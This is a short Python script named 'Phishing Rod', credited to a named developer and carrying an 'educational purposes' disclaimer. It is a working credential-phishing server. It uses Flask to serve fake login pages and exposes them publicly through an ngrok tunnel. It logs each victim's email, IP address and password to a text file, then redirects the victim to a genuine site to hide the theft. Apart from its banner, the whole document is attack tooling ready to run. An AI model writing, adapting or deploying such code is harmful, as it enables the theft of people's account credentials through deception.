print(""" 
██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░  ██████╗░░█████╗░██████╗░
██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░  ██╔══██╗██╔══██╗██╔══██╗
██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░  ██████╔╝██║░░██║██║░░██║
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗  ██╔══██╗██║░░██║██║░░██║
██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝  ██║░░██║╚█████╔╝██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░  ╚═╝░░╚═╝░╚════╝░╚═════╝░ """)
print("***********************Developed by- Alamjeet Singh****************************")
print("***********************Copyright of Alamjeet Singh, 2023***********************")
print("Only for educational purposes, not meant for any unethical use")
print("")
print("")
try:
    from flask import Flask , render_template , request , redirect
except:
    print("I need flask to run.")
try:
    from pyngrok import ngrok
except:
    print("I need pyngrok to run.")

port_no = 5000
app = Flask(__name__, static_folder='static')
raw = open("ngrok/authtoken.txt", 'r')
token = raw.read()
print(f"Authtoken set: {token}")
ngrok.set_auth_token(token)
public_url = ngrok.connect(port_no).public_url
redi_raw = open("site/url.txt", 'r')
site_url = redi_raw.read()

@app.route("/")
def username():
    return render_template("index.html")


@app.route("/next", methods=['POST'])
def next():
    username = request.form['username']
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    with open('user_data.txt', 'a') as file:
        file.write(f'Email: {username}, IP Address: {client_ip}, ')
    return render_template("pass.html", email=username)
@app.route("/pass1", methods=['POST'])
def pass1():
    password = request.form['password']
    with open("user_data.txt", "a") as file:
        file.write(f"Password: {password}\n")
    return redirect(site_url)

print(f"Public URL: {public_url}")
app.run(port=port_no)

